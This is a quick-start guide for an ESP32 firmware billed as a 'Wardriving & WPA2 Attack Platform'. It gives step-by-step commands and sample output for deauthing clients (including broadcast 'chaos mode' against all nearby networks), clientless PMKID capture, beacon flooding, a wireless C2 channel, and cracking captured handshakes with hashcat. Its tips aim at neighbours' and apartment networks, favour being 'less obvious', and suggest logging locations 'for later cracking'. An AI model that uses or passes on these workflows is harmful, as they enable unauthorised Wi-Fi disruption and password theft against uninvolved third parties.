# Sniffy Boi v1.1 - Quick Start Guide

**Fast track from zero to capturing handshakes and running attacks**

---

## Overview

Sniffy Boi v1.1 operates in **two modes**:

1. **Passive Monitoring** - Automatically captures handshakes as they occur naturally
2. **Interactive Commands** - Issue attack commands via serial CLI or wireless C2

This guide covers both modes.

---

## Step 1: Flash Firmware (30 seconds)

```bash
cd /home/user/Projects/esp32

# Build and upload v1.1 (one command)
pio run -e v1_1 --target upload --target monitor
```

**Wait for:**
```
Hard resetting via RTS pin...
--- Terminal on /dev/ttyACM0 | 115200 8-N-1
```

---

## Step 2: Verify Boot (You should see this)

```
╔════════════════════════════════════════════════════════════╗
║                   SNIFFY BOI v1.1.0                        ║
║              Wardriving & WPA2 Attack Platform           ║
╚════════════════════════════════════════════════════════════╝

  Version:     v1.1.0
  Build:       Nov 11 2025 15:30:45
  Platform:    Arduino Nano ESP32
  Chip:        ESP32-S3

  Features:
    - Handshake Capture (WPA/WPA2)
    - PMKID Extraction (clientless)
    - Deauth Attacks (targeted & broadcast)
    - Beacon Flooding
    - Wireless C2 (magic packet commands)
    - Interactive Serial CLI
    - OLED Status Display
    - Hashcat Mode 22000 Export

  Optimizations (v1.1):
    ✓ Font caching (33% faster display)
    ✓ Unified MAC utilities
    ✓ Named constants (improved readability)

  Output:      Hashcat mode 22000
  Network:     Monitor mode (standalone operation)
```

✅ **If you see v1.1.0 above, you're ready!**

❌ **If you see v1.0**, you uploaded the wrong environment. Run: `pio run -e v1_1 --target upload`

---

## Mode 1: Passive Monitoring (Automatic)

**No commands needed** - Sniffy Boi automatically captures packets and displays events.

### What You'll See Automatically

#### Beacon Frames (Access Points Discovered)
```
[BEACON] AA:BB:CC:DD:EE:FF | "HomeNetwork" | Ch:6 | WPA2 | -45dBm
[BEACON] 11:22:33:44:55:66 | "CoffeeShop" | Ch:11 | WPA2 | -62dBm
[BEACON] 22:33:44:55:66:77 | "Neighbor5G" | Ch:48 | WPA2 | -58dBm
```

**What this means:**
- Sniffy Boi is hopping through channels 1-13
- Each beacon = one WiFi network discovered
- RSSI (-45dBm) = signal strength (lower = stronger)

#### EAPOL Handshakes (Automatic Capture)
```
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M1]
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M2]
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M3]
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M4]

╔════════════════════════════════════════════════════════════╗
║          ★★★ COMPLETE HANDSHAKE CAPTURED! ★★★            ║
╚════════════════════════════════════════════════════════════╝
  SSID:     HomeNetwork
  AP:       AA:BB:CC:DD:EE:FF
  Client:   11:22:33:44:55:66
  Channel:  6
  RSSI:     -45 dBm
  Messages: M1=Y M2=Y M3=Y M4=Y
  Key Ver:  2 (AES-CCMP)

✓ Ready for hashcat cracking!

Hashcat 22000 format:
WPA*02*AABBCCDDEEFF*112233445566*486F6D654E6574776F726B*...
════════════════════════════════════════════════════════════
```

**Copy the `WPA*02*...` line and save to a file for hashcat:**
```bash
# On your computer
echo "WPA*02*AABBCCDDEEFF*..." > captures.hc22000

# Crack with hashcat
hashcat -m 22000 captures.hc22000 wordlist.txt
```

#### PMKID Captures (Automatic)
```
╔════════════════════════════════════════════════════════════╗
║            ★★★ PMKID CAPTURED! ★★★                       ║
╚════════════════════════════════════════════════════════════╝
  SSID:     CoffeeShop
  AP:       11:22:33:44:55:66
  Channel:  11
  RSSI:     -55 dBm
  PMKID:    1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D

✓ Ready for hashcat cracking (mode 22000)

Hashcat 22000 format:
WPA*01*112233445566*112233445566*436F666665655368...
════════════════════════════════════════════════════════════
```

**PMKID is faster** - only needs 1 frame vs 4-frame handshake, and works without clients!

---

## Mode 2: Interactive Commands (v1.1 Feature!)

Sniffy Boi v1.1 has a **full command interface** via serial CLI and wireless C2.

### Serial CLI Usage

**Type commands directly in the serial monitor:**

#### 1. Scan for Networks
```
sniffy> scan
```

**Output:**
```
[CommandInterface] Starting WiFi scan (15 seconds)...
[BEACON] AA:BB:CC:DD:EE:FF | "HomeNetwork" | Ch:6 | WPA2 | -45dBm
[BEACON] 11:22:33:44:55:66 | "CoffeeShop" | Ch:11 | WPA2 | -62dBm
[BEACON] 22:33:44:55:66:77 | "Neighbor5G" | Ch:48 | WPA2 | -58dBm

Scan complete. Found 3 networks.
State: SCAN_COMPLETE
```

#### 2. Deauth Attack (Trigger Handshake)
```
sniffy> deauth AA:BB:CC:DD:EE:FF
```

**What happens:**
- Disconnects all clients from target AP
- Clients immediately reconnect
- Sniffy Boi captures handshake during reconnection
- **Result**: Forced handshake in ~10 seconds

**Output:**
```
[CommandInterface] Deauth attack on AA:BB:CC:DD:EE:FF
[RFScanner] Sending deauth frames (10 seconds)...
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M1]
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M2]
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M3]
[EAPOL] Client: 11:22:33:44:55:66 <-> AP: AA:BB:CC:DD:EE:FF [M4]

★★★ COMPLETE HANDSHAKE CAPTURED! ★★★
```

#### 3. Deauth All Clients (Broadcast)
```
sniffy> deauth FF:FF:FF:FF:FF:FF
```

**What happens:**
- Broadcasts deauth to **all clients on all networks**
- Mass disconnection = chaos mode
- High chance of capturing multiple handshakes

**Use case:** Wardriving in dense areas (apartment complex, office building)

#### 4. PMKID Attack (Clientless)
```
sniffy> pmkid AA:BB:CC:DD:EE:FF
```

**What happens:**
- Sends association requests to target AP
- AP responds with PMKID in M1 frame
- **No clients needed!**
- Works on ~70% of routers

**Output:**
```
[CommandInterface] PMKID attack on AA:BB:CC:DD:EE:FF
[PMKIDCapture] Sending association requests...
[PMKIDCapture] PMKID found: 1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D

★★★ PMKID CAPTURED! ★★★
```

#### 5. Handshake Command (Deauth + Capture)
```
sniffy> handshake AA:BB:CC:DD:EE:FF
```

**What happens:**
- Runs deauth attack
- Monitors for handshake
- Exits when handshake captured

**Alias for:** `deauth` + automatic monitoring

#### 6. Beacon Flood (Chaos Mode)
```
sniffy> beaconflood
```

**What happens:**
- Creates 50-100 fake WiFi networks
- Random SSIDs ("FreeWiFi", "FBI Surveillance", etc.)
- Random BSSIDs (MAC addresses)
- Floods WiFi scanner lists

**Use case:** Testing WiFi scanner robustness, denial of service research

**Output:**
```
[CommandInterface] Starting beacon flood...
[RFScanner] Flooding beacons (10 seconds)...
Sent 847 fake beacons
```

#### 7. Status Check
```
sniffy> status
```

**Output:**
```
Current State: IDLE
Session MAC: (none)
Authorized: No
Cooldown: Not active
Uptime: 00:15:32
Handshakes: 2
PMKIDs: 1
```

#### 8. Help
```
sniffy> help
```

**Output:**
```
Available commands:
  scan                    - Scan for WiFi networks (15s)
  deauth <MAC>            - Deauth specific client or AP
  deauth FF:FF:FF:FF:FF:FF - Deauth all clients (broadcast)
  pmkid <BSSID>           - Capture PMKID from AP (clientless)
  handshake <BSSID>       - Trigger handshake capture
  beaconflood             - Start beacon flooding (10s)
  status                  - Show current state and stats
  help                    - Show this help message

Examples:
  sniffy> scan
  sniffy> deauth AA:BB:CC:DD:EE:FF
  sniffy> pmkid 11:22:33:44:55:66
```

---

## Mode 2B: Wireless C2 (Advanced)

**Control Sniffy Boi wirelessly** by sending magic packets (no network connection needed!).

### How It Works

1. **Session Locking**: First wireless command locks to your MAC address
2. **2-minute timeout**: Session expires after 2 minutes of inactivity
3. **Cooldown**: 60-second cooldown after attacks prevent spam

### Wireless Commands

Send specially-crafted WiFi packets with these payloads:

- `SCAN` - Start WiFi scan
- `DEAUTH:AA:BB:CC:DD:EE:FF` - Deauth attack on target
- `PMKID:AA:BB:CC:DD:EE:FF` - PMKID attack
- `HANDSHAKE:AA:BB:CC:DD:EE:FF` - Handshake capture
- `BEACONFLOOD` - Beacon flooding
- `STATUS` - Query device state

**Security:** Only the MAC address that sent the first command can control the device during the session.

📖 **See:** [COMMAND_INTERFACE_GUIDE.md](COMMAND_INTERFACE_GUIDE.md) for wireless C2 implementation details.

---

## State Machine (How Commands Flow)

Sniffy Boi uses an 18-state state machine:

```
IDLE ──> SCANNING ──> SCAN_COMPLETE ──> AWAITING_TARGET
                                              │
                 ┌────────────────────────────┴──────────────┐
                 │                                            │
                 v                                            v
           DEAUTH_ATTACK                              PMKID_ATTACK
                 │                                            │
                 v                                            v
           DEAUTH_COMPLETE                          PMKID_COMPLETE
                 │                                            │
                 └────────────────────> COOLDOWN <───────────┘
                                            │
                                            v
                                         IDLE
```

**Key States:**
- **IDLE**: Waiting for commands, passive monitoring active
- **SCANNING**: 15-second network scan
- **AWAITING_TARGET**: Waiting for target MAC after scan
- **DEAUTH_ATTACK**: Running deauth (10 seconds)
- **PMKID_ATTACK**: Running PMKID capture (10 seconds)
- **COOLDOWN**: 60-second wait before next attack

📖 **See:** [INTERACTIVE_COMMAND_FLOW.md](INTERACTIVE_COMMAND_FLOW.md) for complete state diagram.

---

## Common Workflows

### Workflow 1: Quick Handshake Capture
```
1. sniffy> scan                    # Find networks (15s)
2. sniffy> deauth AA:BB:CC:DD:EE:FF # Deauth target (10s)
3. Wait for "HANDSHAKE CAPTURED!"
4. Copy hashcat line
```

**Total time:** ~30 seconds for WPA2 handshake

### Workflow 2: Clientless PMKID
```
1. sniffy> scan                    # Find networks (15s)
2. sniffy> pmkid AA:BB:CC:DD:EE:FF  # PMKID attack (10s)
3. Wait for "PMKID CAPTURED!"
4. Copy hashcat line
```

**Total time:** ~25 seconds, no clients needed!

### Workflow 3: Wardriving Mode
```
1. sniffy> scan                    # Initial scan (15s)
2. sniffy> deauth FF:FF:FF:FF:FF:FF # Broadcast deauth (10s)
3. Wait for multiple handshakes
4. Collect all hashcat lines
```

**Use case:** Dense urban areas with many networks

### Workflow 4: Passive Collection
```
1. Power on device
2. Open serial monitor
3. Leave running for 30+ minutes
4. Collect automatic captures
```

**Use case:** Low-noise, long-term monitoring

---

## Expected Timeline

### First 10 seconds
- Boot sequence
- POST (Power-On Self Test)
- Engine initialization
- "Setup complete"

### 10-60 seconds
- Beacon frames appear (every AP in range)
- Channel hopping (1-13)
- Device discovery

### 1-10 minutes (Passive Mode)
- EAPOL frames (if clients connecting)
- PMKID captures (if APs support it)
- Automatic handshake collection

### Instant (Interactive Mode)
- Type `scan` - Results in 15 seconds
- Type `deauth` - Handshake in 10-30 seconds
- Type `pmkid` - PMKID in 5-10 seconds

---

## Troubleshooting

### "I don't see any commands when I type"

**Issue:** Your serial terminal may not have local echo enabled.

**Fix:**
- **PlatformIO Monitor**: Enable echo with `--echo`
  ```bash
  pio device monitor --baud 115200 --echo
  ```
- **Screen**: Commands work but don't show - this is normal
- **Arduino IDE**: Use built-in serial monitor with "Show timestamp" off

### "Commands return 'Unknown command'"

**Check:**
1. Version is v1.1 (not v1.0) - type `status` and look for version
2. Spelling is correct (case-insensitive, but check MAC format)
3. MAC addresses use colons: `AA:BB:CC:DD:EE:FF` (not dashes)

### "No handshakes after deauth attack"

**Common causes:**
1. **No clients connected** - Can't deauth non-existent clients
   - **Solution**: Use `pmkid` instead (clientless)
2. **Wrong channel** - Sniffy Boi hopped to different channel
   - **Solution**: Run attack immediately after `scan`
3. **Strong signal override** - Client reconnects too fast
   - **Solution**: Run `deauth` multiple times

### "PMKID attack returns nothing"

**Normal:** ~30% of routers don't support PMKID extraction.

**Solution:** Use traditional handshake capture instead:
```
sniffy> deauth AA:BB:CC:DD:EE:FF
```

### "Device reboots during attack"

**Cause:** Power supply insufficient (ESP32 draws 200-500mA during WiFi TX)

**Fix:**
- Use USB 2.0/3.0 port directly (not hub)
- Try different USB cable (thicker = better)
- Use external 5V power supply (1A+)

### "Only seeing beacons, no handshakes"

**Normal in passive mode:** Handshakes only occur during client connections (rare).

**Solution:** Use interactive commands to **force** handshakes:
```
sniffy> scan
sniffy> deauth AA:BB:CC:DD:EE:FF
```

### "State stuck in COOLDOWN"

**Expected behavior:** After attacks, 60-second cooldown prevents spam.

**Solution:** Wait 60 seconds, or power cycle device to reset state.

### "Session locked to wrong MAC"

**Cause:** Wireless C2 locked to first command sender.

**Solution:**
1. Wait 2 minutes for timeout
2. Or power cycle device
3. Or use serial CLI (not affected by session locks)

---

## Performance Tips

### Maximize Handshake Capture Rate
1. **Position near target** - Get within 10-20 feet for strong signal
2. **Use broadcast deauth** - `deauth FF:FF:FF:FF:FF:FF` hits all clients
3. **Scan first** - Always `scan` before attacks to lock channel
4. **Dense areas** - Apartment buildings = many targets

### Maximize PMKID Success Rate
1. **Try all discovered APs** - ~70% support PMKID
2. **Run multiple times** - Some routers need 2-3 attempts
3. **Use after hours** - Less WiFi congestion at night

### Wardriving Optimization
1. **Use passive mode** for long sessions (less obvious)
2. **Mobile setup** - Battery bank + laptop for mobile capture
3. **Drive slowly** - 5-10 mph gives time for captures
4. **Record locations** - Note where handshakes captured for later cracking

---

## Next Steps

### Save Captures for Cracking
```bash
# On your computer, save hashcat lines to file
cat > captures.hc22000 << 'EOF'
WPA*02*AABBCCDDEEFF*112233445566*486F6D654E6574776F726B*...
WPA*02*112233445566*AABBCCDDEEFF*436F666665655368...
WPA*01*223344556677*223344556677*4E65696768626F72...
EOF

# Crack with hashcat
hashcat -m 22000 captures.hc22000 /usr/share/wordlists/rockyou.txt
```

### Explore Advanced Features
- **[COMMAND_INTERFACE_GUIDE.md](COMMAND_INTERFACE_GUIDE.md)** - Wireless C2 implementation
- **[HANDSHAKE_CAPTURE_GUIDE.md](HANDSHAKE_CAPTURE_GUIDE.md)** - Detailed handshake mechanics
- **[PMKID_ATTACK_GUIDE.md](PMKID_ATTACK_GUIDE.md)** - Clientless attack deep dive
- **[DEAUTH_ATTACK_GUIDE.md](DEAUTH_ATTACK_GUIDE.md)** - Deauth attack variations
- **[BEACON_FLOOD_ATTACK_GUIDE.md](BEACON_FLOOD_ATTACK_GUIDE.md)** - Beacon flooding details

### Build Custom Tools
1. **Wireless C2 sender** - Script to send magic packets
2. **Auto-cracking pipeline** - Captures → hashcat automation
3. **GPS wardriving logger** - Add GPS coordinates to captures
4. **OLED menu system** - Button-based attack selection

---

## Quick Reference Card

### Serial Commands
```
scan                     - Scan networks (15s)
deauth <MAC>             - Deauth target
deauth FF:FF:FF:FF:FF:FF - Broadcast deauth
pmkid <MAC>              - PMKID attack (clientless)
handshake <MAC>          - Handshake capture
beaconflood              - Beacon flood (10s)
status                   - Show state
help                     - Command list
```

### Typical Attack Times
- **Scan**: 15 seconds
- **Deauth**: 10 seconds
- **PMKID**: 5-10 seconds
- **Handshake**: 10-30 seconds (after deauth)
- **Cooldown**: 60 seconds

### Success Rates
- **Handshake capture**: ~95% (if clients present)
- **PMKID extraction**: ~70% (depends on router)
- **Deauth effectiveness**: ~99% (almost always works)

---

## Summary

**Sniffy Boi v1.1 is NOT passive-only!**

You have **two modes**:
1. **Passive** - Automatic captures (good for long-term monitoring)
2. **Interactive** - Command-driven attacks (good for targeted capture)

**Recommended workflow:**
```
1. Flash: pio run -e v1_1 --target upload --target monitor
2. Scan: sniffy> scan
3. Attack: sniffy> deauth <target_mac>
4. Collect: Copy hashcat line
5. Crack: hashcat -m 22000 captures.hc22000 wordlist.txt
```

**Total time from zero to cracked WiFi:** 5-30 minutes (depending on password complexity).

---

**You're ready! Start capturing handshakes! 🎯**
